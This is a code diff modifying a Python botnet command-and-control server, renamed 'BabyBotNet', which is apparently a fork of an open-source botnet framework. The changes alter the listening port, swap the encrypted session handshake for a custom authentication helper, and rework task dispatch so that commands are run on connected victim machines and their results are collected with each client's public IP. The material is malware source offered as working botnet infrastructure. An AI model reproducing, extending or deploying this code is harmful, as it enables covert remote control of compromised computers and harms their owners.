@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-'Command & Control (Build Your Own Botnet)'
+'Command & Control (BabyBotNet)'
 from __future__ import print_function
 
 # standard library
@@ -47,7 +47,7 @@ class C2(threading.Thread):
 
     """
 
-    def __init__(self, host='0.0.0.0', port=1337, debug=False):
+    def __init__(self, host='0.0.0.0', port=28115, debug=False):
         """
         Create a new Command & Control server
 
@@ -87,8 +87,10 @@ class C2(threading.Thread):
         modules = os.path.abspath('BabyServer/modules')
 
         # directory containing user intalled Python packages
-        site_packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'mss' in os.listdir(_)]
-
+        # site_packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'mss' in os.listdir(_)]
+        
+        site_packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_)]
+        
         if len(site_packages):
             n = 0
             globals()['packages'] = site_packages[0]
@@ -228,11 +230,16 @@ class C2(threading.Thread):
 
     @util.threaded
     def serve_until_stopped(self):
+        print("DEBUG run to this ============================>", )
+        
         while True:
             
             connection, address = self.socket.accept()
+            print("DEBUG NEW CONNECTION ============================>", (connection, address))
 
-            session = SessionThread(connection=connection, c2=self)
+            session = SessionThread(connection=connection,client_address=address, c2=self)
+            
+            print("DEBUG session ============================>", session.info)
             if session.info != None:
 
                 # database stores identifying information about session
@@ -280,6 +287,7 @@ class C2(threading.Thread):
             util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
         if 'c2' not in globals()['__threads']:
             globals()['__threads']['c2'] = self.serve_until_stopped()
+            print("DEBUG ===============> ", self.serve_until_stopped())
 
         # admin shell for debugging
         if self.debug:
@@ -315,7 +323,7 @@ class SessionThread(threading.Thread):
 
     """
 
-    def __init__(self, connection=None, id=0, c2=None):
+    def __init__(self, connection=None,client_address=None, id=0, c2=None):
         """
         Create a new Session
 
@@ -331,13 +339,34 @@ class SessionThread(threading.Thread):
         self.id = id
         self.c2 = c2
         self.connection = connection
+        self.client_address = client_address
+        # try:
+        #     self.key = security.diffiehellman(self.connection)
+        #     self.info = self.client_info()
+        #     self.info['id'] = self.id
+        # except Exception as e:
+        #     util.log("Error creating session: {}".format(str(e)))
+        #     self.info = None
+        
+        from BabyServer.corebaby.securityKiet import ClientDispatcher, ClientHelper
+        
+        ClientDispath = ClientDispatcher(self.connection,self.client_address)
+        
+ 
         try:
-            self.key = security.diffiehellman(self.connection)
-            self.info = self.client_info()
-            self.info['id'] = self.id
+            self.key = ClientDispath._do_auth()
+            
+            self.helper = ClientHelper(sock = self.key)
+            self.info = self.helper.get_info()
+            self.info['id'] = self.helper.get_id()
+            print("DEBUG client_address ================>", self.client_address[0])
+            self.info['public_ip'] = self.client_address[0]
+            self.info['owner'] = "admin"
+            
         except Exception as e:
             util.log("Error creating session: {}".format(str(e)))
             self.info = None
+        
 
     def kill(self):
         """
@@ -379,21 +408,25 @@ class SessionThread(threading.Thread):
         to identify the session
 
         """
-        header_size = struct.calcsize("!L")
-        header = self.connection.recv(header_size)
-        msg_size = struct.unpack("!L", header)[0]
-        msg = self.connection.recv(msg_size)
-        data = security.decrypt_aes(msg, self.key)
-        info = json.loads(data)
-        for key, val in info.items():
-            if str(val).startswith("_b64"):
-                info[key] = base64.b64decode(val[6:]).decode('ascii')
-        return info
+        
+        # header_size = struct.calcsize("!L")
+        # header = self.connection.recv(header_size)
+        # msg_size = struct.unpack("!L", header)[0]
+        # msg = self.connection.recv(msg_size)
+        # data = security.decrypt_aes(msg, self.key)
+        # info = json.loads(data)
+        # for key, val in info.items():
+        #     if str(val).startswith("_b64"):
+        #         info[key] = base64.b64decode(val[6:]).decode('ascii')
+                
+      
+        
+        # return info
 
     def send_task(self, task):
         """
         Send task results to the server
-
+        Kiet : now receiver tooo
         `Requires`
         :param dict task:
           :attr str uid:             task ID assigned by server
@@ -410,11 +443,25 @@ class SessionThread(threading.Thread):
             raise TypeError('task must be a dictionary object')
         if not 'session' in task:
             task['session'] = self.id
-        data = security.encrypt_aes(json.dumps(task), self.key)
-        msg  = struct.pack('!L', len(data)) + data
-
-        self.connection.sendall(msg)
-        return True
+        # data = security.encrypt_aes(json.dumps(task), self.key)
+        # msg  = struct.pack('!L', len(data)) + data
+        time_issued = datetime.now()
+        msg = self.helper.execute(task['task'])
+        time_completed = datetime.now()
+        
+        print("send command ==== ", type(time_completed))
+        task_res = {
+            "uid":self.id,
+            "task":task['task'],
+            "session":self.id,
+            "issued":time_issued,
+            "completed":time_completed,
+            "result":msg,
+            
+        }
+        
+        # self.connection.sendall(msg)
+        return task_res
 
     def recv_task(self):
         """
